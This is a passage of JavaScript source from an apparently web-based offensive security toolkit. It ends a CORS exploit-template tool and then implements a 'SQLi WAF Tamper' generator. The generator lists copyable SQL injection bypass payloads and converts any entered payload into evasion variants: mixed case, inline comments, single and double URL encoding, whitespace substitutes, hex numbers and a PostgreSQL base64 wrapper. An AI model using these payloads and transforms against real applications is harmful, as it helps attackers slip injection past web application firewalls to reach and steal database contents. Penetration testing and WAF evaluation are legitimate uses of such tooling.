    setOutput('corsOutput', `CORS origin test vectors:\n\n${vectors.join('\n')}\n\n${'-'.repeat(40)}\n\nExploit template:\n${exploit}`);
}

function clearCors(){
    document.getElementById('corsTarget').value = '';
    document.getElementById('corsAttacker').value = '';
    const out = document.getElementById('corsOutput');
    if(out) out.innerHTML = TOOL_PLACEHOLDER;
}

// =========================
// SQLI WAF TAMPER
// =========================

function buildSqliTamper(panel){
    panel.innerHTML = `
    ${toolHeader('', 'SQLi WAF Tamper', 'Generate common WAF bypass variants for SQL injection payloads')}
    <div class="tool-wrap">
        <div class="tool-title">SQLi WAF Tamper Generator</div>
        <label>SQL Payload</label>
        <textarea id="sqliInput" placeholder="e.g. ' OR 1=1 --"></textarea>
        <label>WAF Profile</label>
        <select id="sqliWaf">
            <option value="generic">Generic WAF</option>
            <option value="modsec">ModSecurity</option>
            <option value="cloudflare">Cloudflare</option>
            <option value="aws">AWS WAF</option>
        </select>
        <div class="button-group">
            <button class="btn btn-run" onclick="runSqliTamper()">Generate Bypass Variants</button>
            <button class="btn btn-outline" onclick="clearSqliTamper()">Clear</button>
        </div>
        ${createOutput('sqliTamperOutput', 'WAF Bypass Variants')}
    </div>
    <div class="tool-wrap">
        <div class="tool-title">WAF Bypass Techniques</div>
        ${[
            ['Case variation', "' Or 1=1 --", 'Mix uppercase and lowercase characters.'],
            ['Comment injection', "' OR/**/1=1/**/--", 'Insert inline comments between keywords.'],
            ['URL encoding', '%27%20OR%201%3D1%20--', 'Encode special characters.'],
            ['Double URL encoding', '%2527%2520OR%25201%253D1', 'Encode an already encoded payload.'],
            ['Whitespace substitutes', "' OR\\t1=1\\r\\n--", 'Use tabs, CR and LF instead of spaces.'],
            ['Hex values', "' OR 0x31=0x31 --", 'Represent numbers or strings as hex.'],
            ['HTTP parameter pollution', 'id=1&id=1 OR 1=1', 'Split payloads across duplicate parameters.'],
        ].map(([name, example, desc]) => `
        <div style="padding:8px; background:var(--panel-light); border-radius:var(--radius-sm); margin-bottom:4px;">
            <div style="display:flex; gap:12px; align-items:flex-start;">
                <div style="flex:1;">
                    <div style="color:var(--primary); font-weight:600; font-size:13px; margin-bottom:2px;">${escapeHtml(name)}</div>
                    <code style="font-size:12px; color:var(--text);">${escapeHtml(example)}</code>
                    <div style="color:var(--muted); font-size:11px; margin-top:2px;">${escapeHtml(desc)}</div>
                </div>
                <button class="output-action-btn" onclick="copyText('${example.replace(/\\/g, '\\\\').replace(/'/g, "\\'")}', this)">Copy</button>
            </div>
        </div>`).join('')}
    </div>`;
}

function runSqliTamper(){
    const payload = document.getElementById('sqliInput').value.trim();
    if(!payload){ showToast('Enter a SQLi payload', 'error'); return; }

    const variants = [
        { name: 'Original', value: payload },
        { name: 'Case mixed', value: payload.replace(/union/gi, 'UnIoN').replace(/select/gi, 'SeLeCt').replace(/where/gi, 'WhErE').replace(/or/gi, 'oR').replace(/and/gi, 'aNd') },
        { name: 'Comment between tokens', value: payload.replace(/\s+/g, '/**/') },
        { name: 'URL encoded', value: encodeURIComponent(payload) },
        { name: 'Double URL encoded', value: encodeURIComponent(encodeURIComponent(payload)) },
        { name: 'Tabs instead of spaces', value: payload.replace(/ /g, '\t') },
        { name: 'Newlines instead of spaces', value: payload.replace(/ /g, '\n') },
        { name: 'Plus instead of spaces', value: payload.replace(/ /g, '+') },
        { name: 'Hex numbers', value: payload.replace(/\b(\d+)\b/g, number => '0x' + parseInt(number, 10).toString(16)) },
        { name: 'HTML entities', value: payload.replace(/'/g, '&#39;').replace(/"/g, '&quot;') },
        { name: 'PostgreSQL base64 wrapper', value: `CONVERT_FROM(DECODE('${btoa(payload)}','base64'),'UTF8')` },
    ];

    const html = variants.map(variant => `
    <div style="padding:8px; background:var(--panel-light); border-radius:var(--radius-sm); margin-bottom:4px;">
        <div style="display:flex; gap:10px; align-items:flex-start;">
            <div style="flex:1;">
                <div style="color:var(--primary); font-size:11px; margin-bottom:4px;">${escapeHtml(variant.name)}</div>
                <div style="font-family:var(--font-mono); font-size:12px; word-break:break-all;">${escapeHtml(variant.value)}</div>
            </div>
            <button class="output-action-btn" onclick="copyText('${variant.value.replace(/\\/g, '\\\\').replace(/'/g, "\\'").replace(/\n/g, '\\n')}', this)">Copy</button>
        </div>
    </div>`).join('');
    setOutput('sqliTamperOutput', html, true);
}

function clearSqliTamper(){
    document.getElementById('sqliInput').value = '';
    const out = document.getElementById('sqliTamperOutput');
    if(out) out.innerHTML = TOOL_PLACEHOLDER;
}
